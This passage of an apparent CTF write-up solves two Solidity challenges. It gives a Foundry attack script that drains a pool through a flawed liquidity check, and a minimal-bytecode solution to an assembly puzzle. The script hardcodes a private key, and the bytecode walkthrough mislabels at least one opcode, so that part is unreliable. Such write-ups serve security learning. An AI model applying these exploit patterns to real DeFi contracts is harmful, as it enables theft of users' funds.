&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;LiquidityToken.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;soliidty&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-soliidty &quot;&gt;&lt;code class=&quot;language-soliidty&quot; data-lang=&quot;soliidty&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.16;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract LiquidityToken is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution&quot; aria-label=&quot;Anchor link for: solution&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;First of all understaning protocol setup is necessary for any DeFi challenge. Seems like the challenge is mentioning about Curve pool and we have a liquidity token and a pool contract.
The &lt;code&gt;Pool&lt;&#x2F;code&gt; contract have the basic swap, add and remove liquidity functions to swap for tokens, adding and removing liquidity in the pool.
The two tokens in the pool are &lt;code&gt;WETH&lt;&#x2F;code&gt; and &lt;code&gt;PuffETH&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Intially in &lt;code&gt;setUp&lt;&#x2F;code&gt; contract minted 11 ether of tokens &lt;code&gt;WETH&lt;&#x2F;code&gt; and &lt;code&gt;PuffETH&lt;&#x2F;code&gt; and provided liquidity to &lt;code&gt;Pool&lt;&#x2F;code&gt; contract.
Setup contract has two claim functions to claim 1 ether of &lt;code&gt;WETH&lt;&#x2F;code&gt; and &lt;code&gt;PuffETH&lt;&#x2F;code&gt; tokens for us. To solve this challenge we need to hold more than half of the shares held by owner.&lt;&#x2F;p&gt;
&lt;p&gt;Owner provided 10 ether of each token to the pool, but we have only 1 ether of each, as soon as the protocol is secured we can&#x27;t actually do this. But we know there is a bug :)&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s find it.&lt;&#x2F;p&gt;
&lt;p&gt;Points to note in the protocol&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;In the &lt;code&gt;swap()&lt;&#x2F;code&gt; function we can swap one token at a time. No flash loan kind of thing (Uniswap)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;addLiquidity()&lt;&#x2F;code&gt; function was checking the in tokens ratios incorrectly, &lt;code&gt;if (amount0 &amp;lt; 0 || amount1 &amp;lt; 0)&lt;&#x2F;code&gt; this improper check will allow us to add &lt;code&gt;0&lt;&#x2F;code&gt; amount of liquidity of a token.&lt;&#x2F;li&gt;
&lt;li&gt;This line &lt;code&gt;uint256 liquidityTokens = ((amount0*amount0) + (amount1*amount1))&#x2F;(1 ether)&lt;&#x2F;code&gt; is calculating the liquidity tokens to mint for us. To get more LP tokens we can make amount0 or amount1 soo bigger then the square of will be even big and it will be devided by 1 ether, but we will get decent number of LP tokens.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;removeLiquidity()&lt;&#x2F;code&gt; function will transfer both the tokens equally (&lt;code&gt;liquidityTokens&#x2F;2&lt;&#x2F;code&gt;).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, now what we can do is, we will swap our &lt;code&gt;WETH&lt;&#x2F;code&gt; completely for &lt;code&gt;PuffETH&lt;&#x2F;code&gt; token and then we provide liquidity of &lt;code&gt;PuffETH&lt;&#x2F;code&gt; token only so that we can make &lt;code&gt;liquidityTokens&lt;&#x2F;code&gt; somewhat higher in calculation.
Then we remove the liquidity to get equal amount of &lt;code&gt;WETH&lt;&#x2F;code&gt; and &lt;code&gt;PuffETH&lt;&#x2F;code&gt; tokens. We will continue this for 2 iterations, so we will get more than 10 ether of &lt;code&gt;WETH&lt;&#x2F;code&gt; and &lt;code&gt;PuffETH&lt;&#x2F;code&gt; tokens. At last providing liquidity of both tokens to the pool
will mint us more LP tokens than owner.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Solve.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script, console} from &amp;quot;lib&#x2F;forge-std&#x2F;src&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Setup, DummyWETH, DummyPUFETH} from &amp;quot;..&#x2F;src&#x2F;Setup.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Pool} from &amp;quot;..&#x2F;src&#x2F;Pool.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {LiquidityToken} from &amp;quot;..&#x2F;src&#x2F;LiquidityToken.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC20} from &amp;quot;..&#x2F;src&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SolveScript is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set = Setup(0xa8e2ccc88E1DE035FD0BF796D9Aad250b8e6e9EB);
&lt;&#x2F;span&gt;&lt;span&gt;    address public user = 0x07009df29BE4772dD6FF1b1166e3598840290e4f;
&lt;&#x2F;span&gt;&lt;span&gt;    Pool public pool;
&lt;&#x2F;span&gt;&lt;span&gt;    DummyWETH  public wethToken;
&lt;&#x2F;span&gt;&lt;span&gt;    DummyPUFETH  public pufethToken;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() public {
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xa69081d2dbfafc79223895b25b0317a5dc473f617ba900b482c2664af6025a50);
&lt;&#x2F;span&gt;&lt;span&gt;        pool = set.pool();
&lt;&#x2F;span&gt;&lt;span&gt;        (address weth, address pufeth) = pool.getTokens();
&lt;&#x2F;span&gt;&lt;span&gt;        wethToken = DummyWETH(weth);
&lt;&#x2F;span&gt;&lt;span&gt;        pufethToken = DummyPUFETH(pufeth);
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; set.claimPUFETH();
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; set.claimWETH();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User : &amp;quot;, msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyWETH balance :&amp;quot;, wethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyPUFETH balance :&amp;quot;, pufethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User LiquidityToken balance :&amp;quot;, pool.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Setup LiquidityToken balance :&amp;quot;, pool.balanceOf(address(set)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;iFee :&amp;quot;, pool.getFee());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        wethToken.approve(address(pool), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        pufethToken.approve(address(pool), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 lpBal = pool.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;        for(uint8 i; i&amp;lt;2; i++){
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 wethBal = wethToken.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;            pool.swap(address(wethToken), wethBal);
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 pufethBal = pufethToken.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;            pool.addLiquidity(0 ether, pufethBal);
&lt;&#x2F;span&gt;&lt;span&gt;            lpBal = pool.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;            pool.removeLiquidity(lpBal);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 pufethBal = pufethToken.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 wethBal = wethToken.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;        pool.addLiquidity(wethBal,pufethBal);
&lt;&#x2F;span&gt;&lt;span&gt;        lpBal = pool.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyWETH balance :&amp;quot;, wethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyPUFETH balance :&amp;quot;, pufethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyWETH balance :&amp;quot;, wethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User DummyPUFETH balance :&amp;quot;, pufethToken.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;User LiquidityToken balance :&amp;quot;, pool.balanceOf(user));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Setup LiquidityToken balance :&amp;quot;, pool.balanceOf(address(set)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() :&amp;quot;, set.isSolved(user));
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h1 id=&quot;runing-attack-script&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#runing-attack-script&quot; aria-label=&quot;Anchor link for: runing-attack-script&quot;&gt;Runing attack script&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;forge script script&#x2F;Solve.s.sol:SolveScript --rpc-url &amp;lt;RPC_URL&amp;gt; --broadcast&lt;&#x2F;p&gt;
&lt;h1 id=&quot;easypeasy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#easypeasy&quot; aria-label=&quot;Anchor link for: easypeasy&quot;&gt;EasyPeasy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Setup.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.15;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;challenge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    Challenge public challenge;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() payable{
&lt;&#x2F;span&gt;&lt;span&gt;        challenge = new Challenge();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return challenge.solved();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Challenge.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.17;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Challenge {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private constant stick = 0xd4fd4e189132273036449fc9e11198c739161b4c0116a9a2dccdfa1c492006f1;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private constant maxCodeSize = 30;
&lt;&#x2F;span&gt;&lt;span&gt;    bool public solved=false;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function func(bytes memory input) external payable {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address addr;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes4 value4;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 codeSize;
&lt;&#x2F;span&gt;&lt;span&gt;        uint combined;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            let base := add(input, 0x20)
&lt;&#x2F;span&gt;&lt;span&gt;            let first20 := shr(96, mload(base))
&lt;&#x2F;span&gt;&lt;span&gt;            addr := first20
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            codeSize := extcodesize(addr)
&lt;&#x2F;span&gt;&lt;span&gt;            if gt(codeSize, maxCodeSize) {
&lt;&#x2F;span&gt;&lt;span&gt;                revert(0, 0)
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            let data := mload(add(input, 0x34))       
&lt;&#x2F;span&gt;&lt;span&gt;            value4 := data
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            let value := callvalue()
&lt;&#x2F;span&gt;&lt;span&gt;            let value1 := value
&lt;&#x2F;span&gt;&lt;span&gt;            let value3 := 0
&lt;&#x2F;span&gt;&lt;span&gt;            let value2 := 0
&lt;&#x2F;span&gt;&lt;span&gt;            
&lt;&#x2F;span&gt;&lt;span&gt;            for { } gt(value1, 0) { value1 := shr(1, value1) } {
&lt;&#x2F;span&gt;&lt;span&gt;                value3 := shl(1, value3)
&lt;&#x2F;span&gt;&lt;span&gt;                value3 := or(value3, and(value1, 1))
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            let bool1 := eq(value, value3)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            value1 := value
&lt;&#x2F;span&gt;&lt;span&gt;            for { } gt(value1, 0) { value1 := and(value1, sub(value1, 1)) } {
&lt;&#x2F;span&gt;&lt;span&gt;                value2 := add(value2, 1)
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            let bool2 := or(lt(value2, 4), eq(value2, 3))
&lt;&#x2F;span&gt;&lt;span&gt;            combined := and(bool1, bool2)
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            require(combined==1, &amp;quot;Condition failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success1, bytes memory ret1) = addr.call(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success1, &amp;quot;Call failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(ret1.length &amp;gt; 0, &amp;quot;No return data&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        bytes1 retValue1 = bytes1(ret1[0]);
&lt;&#x2F;span&gt;&lt;span&gt;        require(retValue1 == &amp;quot;L&amp;quot;, &amp;quot;Invalid return value&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success2, bytes memory ret2) = addr.call{value: msg.value}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success2, &amp;quot;Call failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(ret2.length &amp;gt; 0, &amp;quot;No return data&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        bytes1 retValue2 = bytes1(ret2[0]);
&lt;&#x2F;span&gt;&lt;span&gt;        require(retValue2 == &amp;quot;M&amp;quot;, &amp;quot;Invalid return value&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 hashedValue = keccak256(abi.encodePacked(value4));
&lt;&#x2F;span&gt;&lt;span&gt;        require(hashedValue == stick, &amp;quot;Hash mismatch&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        solved = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-1&quot; aria-label=&quot;Anchor link for: solution-1&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Solution is simple, we need to call &lt;code&gt;func()&lt;&#x2F;code&gt; function on &lt;code&gt;Challenge&lt;&#x2F;code&gt; contract.
And we have to pass through all the checks and reach the last line of execution to solve this.&lt;&#x2F;p&gt;
&lt;p&gt;We need to pass a &lt;code&gt;bytes&lt;&#x2F;code&gt; input that satisfies all the conditions written in assembly.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s analyze the challenge and its solution step by step.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;challenge-analysis&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#challenge-analysis&quot; aria-label=&quot;Anchor link for: challenge-analysis&quot;&gt;Challenge Analysis&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The challenge has several checks we need to pass:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Code Size Check&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;codeSize := extcodesize(addr)
&lt;&#x2F;span&gt;&lt;span&gt;if gt(codeSize, maxCodeSize) {
&lt;&#x2F;span&gt;&lt;span&gt;    revert(0, 0)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Our deployed contract must be less than 30 bytes in size.&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;Value Checks&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;let value := callvalue()
&lt;&#x2F;span&gt;&lt;span&gt;let value1 := value
&lt;&#x2F;span&gt;&lt;span&gt;let value3 := 0
&lt;&#x2F;span&gt;&lt;span&gt;let value2 := 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; First check: value must be palindrome in binary
&lt;&#x2F;span&gt;&lt;span&gt;for { } gt(value1, 0) { value1 := shr(1, value1) } {
&lt;&#x2F;span&gt;&lt;span&gt;    value3 := shl(1, value3)
&lt;&#x2F;span&gt;&lt;span&gt;    value3 := or(value3, and(value1, 1))
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;let bool1 := eq(value, value3)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Second check: value must have exactly 2 bits set
&lt;&#x2F;span&gt;&lt;span&gt;value1 := value
&lt;&#x2F;span&gt;&lt;span&gt;for { } gt(value1, 0) { value1 := and(value1, sub(value1, 1)) } {
&lt;&#x2F;span&gt;&lt;span&gt;    value2 := add(value2, 1)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;let bool2 := or(lt(value2, 4), eq(value2, 3))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We need to send exactly 3 wei (which has 2 bits set and is palindrome in binary).&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;&lt;strong&gt;Return Value Checks&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;require(retValue1 == &amp;quot;L&amp;quot;, &amp;quot;Invalid return value&amp;quot;);  &#x2F;&#x2F; First call
&lt;&#x2F;span&gt;&lt;span&gt;require(retValue2 == &amp;quot;M&amp;quot;, &amp;quot;Invalid return value&amp;quot;);  &#x2F;&#x2F; Second call with value
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Our contract must return &quot;L&quot; on normal call and &quot;M&quot; when called with value.&lt;&#x2F;p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;&lt;strong&gt;Hash Check&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;bytes32 hashedValue = keccak256(abi.encodePacked(value4));
&lt;&#x2F;span&gt;&lt;span&gt;require(hashedValue == stick, &amp;quot;Hash mismatch&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;value4&lt;&#x2F;code&gt; (deadbeef) must hash to the specified stick value.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;solution-explanation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-explanation&quot; aria-label=&quot;Anchor link for: solution-explanation&quot;&gt;Solution Explanation&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Let&#x27;s break down our solution:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;First, we deploy a minimal contract that satisfies all conditions. The bytecode is:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;6018600c60003960186000f33415600e57604d5f526020601ff35b604c5f526020601ff3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Let&#x27;s decode this bytecode:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;60 18       &#x2F;&#x2F; PUSH1 0x18 (24 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;60 0c       &#x2F;&#x2F; PUSH1 0x0c (12 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00
&lt;&#x2F;span&gt;&lt;span&gt;39          &#x2F;&#x2F; CODESIZE
&lt;&#x2F;span&gt;&lt;span&gt;60 18       &#x2F;&#x2F; PUSH1 0x18
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00
&lt;&#x2F;span&gt;&lt;span&gt;f3          &#x2F;&#x2F; RETURN
&lt;&#x2F;span&gt;&lt;span&gt;34          &#x2F;&#x2F; CALLVALUE
&lt;&#x2F;span&gt;&lt;span&gt;15          &#x2F;&#x2F; ISZERO
&lt;&#x2F;span&gt;&lt;span&gt;60 0e       &#x2F;&#x2F; PUSH1 0x0e
&lt;&#x2F;span&gt;&lt;span&gt;57          &#x2F;&#x2F; JUMPI
&lt;&#x2F;span&gt;&lt;span&gt;60 4d       &#x2F;&#x2F; PUSH1 0x4d (&amp;#39;M&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;5f          &#x2F;&#x2F; PUSH0
&lt;&#x2F;span&gt;&lt;span&gt;52          &#x2F;&#x2F; MSTORE
&lt;&#x2F;span&gt;&lt;span&gt;60 20       &#x2F;&#x2F; PUSH1 0x20
&lt;&#x2F;span&gt;&lt;span&gt;60 1f       &#x2F;&#x2F; PUSH1 0x1f
&lt;&#x2F;span&gt;&lt;span&gt;f3          &#x2F;&#x2F; RETURN
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This bytecode creates a contract that:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Returns &quot;L&quot; when called normally&lt;&#x2F;li&gt;
&lt;li&gt;Returns &quot;M&quot; when called with value&lt;&#x2F;li&gt;
&lt;li&gt;Is exactly 24 bytes in size (satisfying the size check)&lt;&#x2F;li&gt;
&lt;li&gt;Has proper control flow to handle both cases&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The contract logic:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;If CALLVALUE is 0 (normal call):
&lt;ul&gt;
&lt;li&gt;Store &quot;L&quot; in memory&lt;&#x2F;li&gt;
&lt;li&gt;Return &quot;L&quot;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;If CALLVALUE is non-zero (call with value):
&lt;ul&gt;
&lt;li&gt;Store &quot;M&quot; in memory&lt;&#x2F;li&gt;
&lt;li&gt;Return &quot;M&quot;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;attack-script-explanation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#attack-script-explanation&quot; aria-label=&quot;Anchor link for: attack-script-explanation&quot;&gt;Attack Script Explanation&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract SolveScript is Script {
